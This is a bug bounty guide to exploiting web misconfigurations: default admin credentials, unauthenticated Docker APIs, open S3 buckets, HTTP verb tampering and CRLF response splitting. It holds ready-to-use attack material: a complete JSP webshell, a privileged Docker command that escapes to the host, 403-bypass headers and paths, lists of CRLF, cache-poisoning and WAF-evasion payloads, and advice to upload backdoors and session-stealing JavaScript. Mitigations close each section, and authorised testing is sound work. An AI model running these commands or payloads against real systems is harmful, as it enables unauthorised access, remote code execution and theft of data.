## Overview

Misconfigurations are among the most common and exploitable vulnerabilities in web applications. They occur when systems, services, or applications are deployed with insecure default settings, exposed APIs, improper access controls, or poorly configured security mechanisms. Unlike complex logic flaws, misconfigurations are often straightforward to exploit once identified—making them prime targets for bug bounty hunters.

**Key Categories:**

- Default/weak credentials on admin panels and services
- Exposed Docker APIs without authentication
- S3 bucket permission issues
- HTTP method/verb abuse and tampering
- HTTP response splitting via CRLF injection

---

## 1. Default Credentials & Admin Panels

### Theory

Many applications ship with default credentials that administrators fail to change. Common username/password combos like `admin:admin`, `root:root`, or `tomcat:tomcat` are still widely used. Admin panels are often accessible through predictable paths or subdomains.

### Discovery Methods

**Common Admin Panel URLs:**

```
https://target.com/admin
https://target.com/admin-console
https://target.com/console
https://target.com/administrator
https://admin.target.com
https://admin-console.target.com
https://console.target.com
```

**Third-Party Service Patterns:**

- Format: `https://target.<ServiceName>.com/login`
- Examples: Okta, WordPress, Jenkins, Grafana
- Search for default creds: `intext:'password' intext:'default' [Service Name]`

### Exploitation Steps

**Step 1: Identify the Service**

- Check login page headers, footers, or source code for service name/version
- Use Wappalyzer or similar tools

**Step 2: Find Default Credentials**

📋 **Top Default Credential Lists:**

- [SecLists Default-Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [DefaultCreds Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
- [CIRT.net Database](https://cirt.net/passwords)
- [Datarecovery.com Default Passwords](https://datarecovery.com/rd/default-passwords/)

**Common Combinations:**

|Username|Password|
|---|---|
|admin|admin|
|root|root|
|tomcat|tomcat|
|password|password|
|administrator|administrator|
|admin|password|
|user|user|
|test|test|
|guest|guest|
|demo|demo|

**Step 3: Google Dork Search**

```
intext:'password' intext:'default' [Application Name]
site:github.com [Application Name] default password
[Application Name] vendor documentation default credentials
```

**Step 4: Check Documentation**

- Vendor manuals (often PDF format)
- GitHub repositories (search for config files)
- Docker Hub descriptions
- Product wikis

### Bypasses

**Header Injection to Access Forbidden Admin Pages:**

When you get `403 Forbidden` on admin paths, try these headers in Burp Suite:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

```http
GET / HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

```http
GET / HTTP/1.1
Host: target.com
X-Custom-IP-Authorization: 127.0.0.1
```

**Path Manipulation:**

```
/admin/..;/
/admin/.
/%2e/admin
/admin%20/
/admin..;/
```

### Higher Impact

✅ **Chain with:**

- Credential stuffing on other services with same creds
- Privilege escalation if default admin has limited access
- API key extraction from admin panels
- Database access through admin interface
- SSRF via admin functionality

### Mitigations

- Enforce password change on first login
- Remove/disable default accounts
- Implement account lockout policies
- Use strong random passwords by default
- Hide admin panels behind VPN or IP whitelist

---

## 2. Docker API Unauthorized RCE

### Theory

Docker daemon (`dockerd`) exposes a REST API for remote management. By default, it listens on Unix socket `/var/run/docker.sock`, but when bound to a public interface (ports 2375/2376) without authentication, attackers gain full container control—leading to easy RCE.

### Discovery Methods

**Port Scanning:**

```bash
nmap -p 2375,2376 target.com
nmap -Pn -p 2375,2376 target.com
nmap -sV -p 2375 target.com
nmap -p- target.com  # Full port scan
```

**HTTP Verification:**

```bash
curl http://target.com:2375
# Response: {"message":"page not found"}

curl http://target.com:2375/version
# Returns Docker version info if exposed
```

### Exploitation Steps

**Step 1: Confirm Docker API Access**

```bash
docker -H target.com:2375 info
```

**Step 2: List Containers**

```bash
# Running containers
docker -H target.com:2375 ps

# All containers (including stopped)
docker -H target.com:2375 ps -a
```

**Step 3: Execute Commands (RCE)**

```bash
# Get shell in running container
docker -H target.com:2375 exec -it <container_name> /bin/bash

# Or use sh if bash unavailable
docker -H target.com:2375 exec -it <container_id> /bin/sh
```

**Step 4: Deploy Malicious Container**

```bash
# Pull and run privileged container
docker -H target.com:2375 run -it --privileged --net=host --pid=host --ipc=host --volume /:/host alpine chroot /host

# Now you're in the HOST system, not just container
```

**Step 5: Extract Sensitive Data**

```bash
# List images (might contain secrets)
docker -H target.com:2375 images

# Inspect container for environment variables
docker -H target.com:2375 inspect <container_id>

# Download container filesystem
docker -H target.com:2375 export <container_id> > container.tar
```

### Higher Impact

💥 **Critical Escalation Paths:**

- Mount host filesystem to container (`--volume /:/host`)
- Access AWS metadata endpoint from container network
- Pivot to internal network services
- Extract secrets from environment variables
- Backdoor existing containers

### Mitigations

- Never expose Docker API to public internet
- Use TLS with client certificate authentication (port 2376)
- Implement firewall rules restricting access to trusted IPs
- Use Docker Socket Proxy with ACL
- Enable Docker Content Trust

---

## 3. S3 Bucket Misconfiguration

### Theory

AWS S3 buckets with overly permissive access policies allow unauthorized listing, reading, writing, or deleting of objects. Misconfigurations stem from public ACLs, bucket policies allowing `*` principals, or lack of authentication requirements.

### Exploitation Steps

**Prerequisites:**

```bash
pip install awscli
aws configure  # Set dummy keys or leave blank for anonymous access
```

**Step 1: Test Anonymous Listing**

```bash
aws s3 ls s3://target-bucket-name

# If authentication error occurs:
aws s3 ls s3://target-bucket-name --no-sign-request
```

**Step 2: Attempt File Upload**

```bash
# Create test file
echo "Bug Bounty Test - DELETE ME" > test.txt

# Try uploading
aws s3 cp test.txt s3://target-bucket-name/test.txt --no-sign-request

# Alternative: use mv
aws s3 mv test.txt s3://target-bucket-name/test.txt --no-sign-request
```

**Step 3: Test File Deletion**

```bash
aws s3 rm s3://target-bucket-name/test.txt --no-sign-request
```

**Step 4: Sync Entire Bucket (Download All)**

```bash
aws s3 sync s3://target-bucket-name ./local-folder --no-sign-request
```

**Step 5: Check Bucket Policy**

```bash
aws s3api get-bucket-policy --bucket target-bucket-name --no-sign-request
```

### Payloads

**Test File Contents (Safe for PoC):**

```
Bug Bounty Security Test
Researcher: [Your Name]
Date: [Date]
This file should not be publicly writable.
Please delete and contact: [Your Email]
```

### Discovery Methods

🔍 **Finding S3 Buckets:**

**In JavaScript/Source Code:**

```bash
# Search for S3 URLs
grep -r "s3.amazonaws.com" .
grep -r "s3-[a-z0-9-]*.amazonaws.com" .
```

**Common Naming Patterns:**

```
company-name
company-name-backups
company-name-uploads
company-name-images
company-name-dev
company-name-prod
company-name-staging
company-logs
target-media
target-assets
```

**Using Google Dorks:**

```
site:s3.amazonaws.com "target.com"
site:s3.amazonaws.com intitle:index.of.bucket
```

### Higher Impact

🎯 **Escalation Strategies:**

- Upload malicious JavaScript to steal session tokens
- Replace legitimate files with backdoored versions
- Access backup files containing database credentials
- Find `.env` files with API keys
- Discover PII/customer data for data breach impact

### Mitigations

- Block public access at account level
- Use bucket policies with least privilege
- Enable S3 Block Public Access settings
- Implement bucket encryption
- Enable access logging and monitoring
- Use IAM roles instead of hardcoded credentials

---

## 4. HTTP Methods Abuse & Verb Tampering

### Theory

**Verb Tampering:** Bypassing access controls by using alternative HTTP methods (GET, POST, HEAD, OPTIONS, etc.) when security filters only check specific methods.

**Method Abuse:** Exploiting dangerous HTTP methods like `PUT`, `DELETE`, `TRACE` that shouldn't be enabled but are.

### Discovery Methods

**Automated Scanning:**

```bash
# Using httpmethods tool
httpmethods -u "https://target.com/"
httpmethods -u "https://target.com/admin"

# Manual OPTIONS request
curl --include --request OPTIONS "https://target.com/"
```

**Manual Testing All Methods:**

```bash
for method in GET POST PUT DELETE HEAD TRACE OPTIONS CONNECT PATCH; do
  echo "Testing $method:"
  curl -X $method -I https://target.com/restricted
done
```

### Exploitation Steps

**Step 1: Test Verb Tampering on Restricted Page**

If `GET /admin` returns 403:

```bash
# Try different methods
curl -X POST https://target.com/admin
curl -X HEAD https://target.com/admin
curl -X OPTIONS https://target.com/admin
curl -X TRACE https://target.com/admin
```

**In Burp Suite:**

```http
GET /admin HTTP/1.1
Host: target.com

# Change to:
POST /admin HTTP/1.1
Host: target.com
Content-Length: 0
```

**Step 2: Test PUT Method for File Upload**

```bash
# Upload PHP backdoor
curl --upload-file backdoor.php https://target.com/uploads/backdoor.php

# Test with benign file first
echo "test" > test.txt
curl --upload-file test.txt https://target.com/uploads/test.txt
```

**Step 3: Test DELETE Method**

```bash
curl -X DELETE https://target.com/uploads/test.txt
```

**Step 4: Test TRACE Method (XST)**

```bash
curl -X TRACE https://target.com/
# If enabled, response includes request headers (potential session token leak)
```

### Apache Tomcat PUT Upload - CVE-2017-12615

**Affected Versions:** Tomcat 7.0.0 - 7.0.79 on Windows

**Test File (test.jsp):**

```jsp
<% out.write("<html><body><h3>JSP Upload Test</h3></body></html>"); %>
```

**Upload:**

```bash
curl --upload-file test.jsp https://target.com/test.jsp
```

**If successful, upload webshell:**

```jsp
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    BufferedReader reader = new BufferedReader(new InputStreamReader(in));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
</pre>
</BODY></HTML>
```

**Execute:**

```
https://target.com/shell.jsp?cmd=whoami
```

### Payloads

**10 Modern HTTP Method Bypass Payloads:**

```http
1. POST /admin HTTP/1.1

2. HEAD /admin HTTP/1.1

3. OPTIONS /admin HTTP/1.1

4. PUT /admin HTTP/1.1

5. TRACE /admin HTTP/1.1

6. GET /admin HTTP/1.1
   X-HTTP-Method-Override: PUT

7. POST /admin HTTP/1.1
   X-Method-Override: GET

8. GET /admin HTTP/1.1
   X-Original-Method: POST

9. GET / HTTP/1.1
   X-Original-URL: /admin

10. PATCH /admin HTTP/1.1
```

### Higher Impact

- Combine PUT with path traversal: `PUT /../../../var/www/shell.php`
- Chain TRACE with XSS for session token theft
- Use verb tampering to bypass WAF rules
- DELETE critical configuration files

### Mitigations

- Disable unnecessary HTTP methods
- Implement method validation in application logic
- Use web application firewall (WAF) rules
- Configure server to return 405 Method Not Allowed
- Disable WebDAV if not needed

---

## 5. HTTP Response Splitting (CRLF Injection)

### Theory

HTTP uses CRLF sequences (`\r\n` or `%0D%0A`) to separate headers and body sections. When user input is reflected in HTTP responses without proper sanitization, attackers can inject CRLF characters to craft arbitrary response headers or inject content into the response body, leading to XSS, cache poisoning, or information disclosure.

### Discovery Methods

**Common Vulnerable Parameters:**

- `?page=`, `?url=`, `?redirect=`
- `?lang=`, `?language=`, `?locale=`
- `?id=`, `?question=`, `?search=`
- Cookie values
- Custom headers reflecting user input

**Test Payload:**

```
?page=test%0D%0AX-Injected-Header:%20Pwned
```

### Exploitation Steps

**Step 1: Identify Reflection Point**

```bash
curl -i "https://target.com/index.php?lang=test"
# Check if parameter value appears in response headers
```

**Step 2: Inject CRLF Sequence**

```bash
curl -i "https://target.com/?lang=en%0D%0AX-Injected:%20Test"
```

**Expected Response:**

```http
HTTP/1.1 200 OK
X-Custom-Language: en
X-Injected: Test
Content-Type: text/html
```

**Step 3: Response Splitting for XSS**

Headers and body are separated by double CRLF (`%0D%0A%0D%0A`):

```
?lang=en%0D%0AContent-Length:%2035%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(document.domain)</script>
```

**Step 4: Cookie Injection**

```
?redirect=home%0D%0ASet-Cookie:%20admin=true
```

### Payloads

**10 Modern CRLF Injection Payloads:**

```
1. test%0D%0AX-Injected-Header:%20Value

2. test%0D%0ASet-Cookie:%20sessionid=malicious

3. test%0D%0ALocation:%20https://attacker.com

4. test%0D%0A%0D%0A<script>alert(1)</script>

5. test%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A

6. test%0AX-Header:%20injected (LF only - some servers)

7. test%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<img%20src=x%20onerror=alert(1)>

8. test%E5%98%8A%E5%98%8DX-Injected:%20Unicode (Unicode CRLF bypass)

9. test%0D%0ACache-Control:%20public%0D%0A%0D%0A<script>/*poison*/</script>

10. test%23%0D%0ASet-Cookie:%20admin=1 (URL fragment + CRLF)
```

### Bypasses

**WAF/Filter Evasion:**

```
# URL encoding variations
%0D%0A  (standard)
%0d%0a  (lowercase)
%250D%250A  (double encoding)

# Unicode encoding
%E5%98%8A%E5%98%8D  (Unicode CRLF)

# Mixed encoding
\r\n
\u000d\u000a

# Space variations
%20, +, %09 (tab)

# LF only (works on some servers)
%0A

# Using other line terminators
%00%0D%0A
```

### Higher Impact

🔥 **Critical Chains:**

1. **Cache Poisoning:** Inject response that gets cached, affecting all users
2. **Session Fixation:** `Set-Cookie` injection to fixate session IDs
3. **Open Redirect → XSS:** `Location: javascript:alert(1)`
4. **Response Splitting → Content Spoofing:** Fake HTML content injection
5. **HTTP Request Smuggling:** Split responses to desync request/response matching

**Example - Cache Poisoning:**

```
?page=home%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>/* All users get this */</script>
```

### Mitigations

- Sanitize all user input before reflection in headers
- URL-encode or remove CRLF characters (`\r`, `\n`)
- Use security libraries that prevent header injection
- Set `Content-Length` explicitly to prevent response splitting
- Implement strict input validation on redirect/language parameters
- Use modern frameworks with built-in CRLF protection

---

## References & Resources

**Official Documentation:**

- [OWASP Default Credentials Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials)
- [OWASP HTTP Methods Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [CRLF Injection - Netsparker](https://www.netsparker.com/blog/web-security/crlf-http-header/)

**Payload Collections:**

- [PayloadsAllTheThings - CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md)
- [PayloadsAllTheThings - HTTP Methods](https://github.com/swisskyrepo/PayloadsAllTheThings)

**HackerOne Reports:**

- [Default Credentials #192074](https://hackerone.com/reports/192074)
- [Default Credentials #174883](https://hackerone.com/reports/174883)
- [Default Credentials #398797](https://hackerone.com/reports/398797)
- [S3 Bucket Misconfiguration #700051](https://hackerone.com/reports/700051)
- [S3 Bucket Misconfiguration #229690](https://hackerone.com/reports/229690)

**Additional Resources:**

- [Bug Bounty POC - S3 Basics to Pawn](https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn)
- [Wikipedia - Common Passwords](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)